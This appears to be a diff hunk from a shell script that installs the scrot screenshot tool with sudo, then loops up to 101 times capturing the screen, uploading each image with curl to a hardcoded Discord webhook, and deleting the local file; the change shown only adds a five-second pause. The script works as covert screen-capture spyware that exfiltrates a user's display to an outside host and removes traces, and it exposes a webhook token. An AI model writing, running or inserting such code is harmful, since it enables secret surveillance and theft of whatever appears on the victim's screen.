@@ -27,6 +27,7 @@ sudo -S sh -c "sudo apt install scrot -y"
 for i in {0..100}
 do
 	scrot "ss.png"
+ 	sleep 5
 	curl -F "filename=@/home/$USER/ss.png" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6" 
 	sleep 5
  	rm -f "/home/$USER/ss.png"
